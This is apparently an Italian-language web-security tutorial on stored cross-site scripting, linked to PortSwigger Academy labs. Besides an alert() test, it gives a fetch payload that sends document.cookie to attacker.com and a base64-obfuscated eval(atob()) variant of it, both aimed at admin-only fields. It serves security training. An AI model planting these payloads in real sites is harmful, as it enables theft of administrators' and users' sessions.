# Stored XSS

**Difficoltà:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [02-Reflected-XSS.md](02-Reflected-XSS.md)
**Lab:** PortSwigger Academy, Stored XSS

---

## Obiettivo

Con la reflected devi convincere qualcuno a cliccare un link; con la stored il lavoro sporco lo fa l'applicazione al posto tuo, mostrando il tuo payload a chiunque visiti quella pagina. Qui vedi come sfruttare campi che salvano input nel database (commenti, profili, recensioni, ticket di supporto) per eseguire JS contro chiunque visualizzi il contenuto: impatto molto maggiore della reflected, e colpisce più vittime senza bisogno di link diretti.

---

## Concetti chiave

### Dove cercare stored XSS

| Feature applicativa | Chi visualizza l'output |
|----------------------|---------------------------|
| Commenti/recensioni | altri utenti pubblici |
| Nome profilo/bio | chiunque visiti il profilo |
| Ticket di supporto | operatori/admin del supporto |
| Nome file caricato | admin panel di gestione upload |
| User-Agent/Referer loggati | dashboard di analytics interna |

**Nota:** i campi visti solo dall'admin (es. ticket, log) sono il bersaglio più prezioso che troverai: pochi sviluppatori pensano a sanitizzare "tanto lo vede solo l'admin", ed è esattamente lì che uno XSS può portare a compromissione completa del pannello.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Repeater | invio payload nel campo | salvataggio confermato | poi verifica visualizzazione |
| Browser (sessione secondaria) | visualizza come altro utente | conferma esecuzione reale | usa profilo browser diverso o incognito |

---

## Payload / Esempi

### Esempio 1: stored XSS in commento pubblico

```html
<script>alert(document.domain)</script>
```

**Step-by-step:**
```
1. Invia il commento con il payload sopra
2. Naviga alla pagina che mostra i commenti con un'altra sessione/browser
3. Conferma esecuzione del popup
```

### Esempio 2: stored XSS mirata all'admin (via campo visibile solo in dashboard)

```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

Inserito ad esempio nel campo "nome" di un ordine/richiesta di supporto: quando l'admin apre il pannello per gestirlo, il payload esegue nel suo contesto e invia il cookie di sessione admin all'attaccante.

### Esempio 3: bypass filtro lunghezza campo con payload compatto

```html
<svg/onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vYz9jPScrZG9jdW1lbnQuY29va2llKQ=='))>
```

**Spiegazione:** payload lungo codificato in base64 dentro un `eval(atob(...))` breve, utile quando il campo ha un limite di caratteri stretto.

---

## Evasion / Bypass Techniques

Vedi [06-WAF-Evasion.md](06-WAF-Evasion.md) per bypass generali; per stored XSS in particolare, verifica sempre se la sanitizzazione avviene solo in input (al salvataggio) o anche in output (alla visualizzazione): a volte solo una delle due è implementata.

---

## Lab Hands-On

### Lab 1: PortSwigger, Stored XSS into HTML context with nothing encoded
**Obiettivo:** eseguire XSS persistente in una recensione prodotto
**Difficulty:** Facile
**Time:** 20 min

**Walkthrough breve:**
1. Trova un campo che salva input (es. commento)
2. Inserisci payload script
3. Visualizza la pagina come altro utente per confermare esecuzione

---

## Common Mistakes

- Testare solo con la propria sessione -> non hai dimostrato nulla finché non confermi che il payload esegue anche per ALTRI utenti che visualizzano il contenuto
- Ignorare i campi "invisibili" (visti solo dall'admin) -> sono spesso i più vulnerabili, proprio perché meno testati dagli sviluppatori

---

## Link Utili

- [PortSwigger: Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)

---

## Connessioni

- **Prerequisito:** [02-Reflected-XSS.md](02-Reflected-XSS.md)
- **Prossimo Step:** [04-DOM-XSS.md](04-DOM-XSS.md)
- **Combinazione con:** [07-Cookie-Stealing.md](07-Cookie-Stealing.md)

---

## Checklist di padronanza

- [ ] So trovare campi persistenti vulnerabili
- [ ] So confermare esecuzione con sessione/utente separato
- [ ] So identificare campi "solo-admin" ad alto impatto

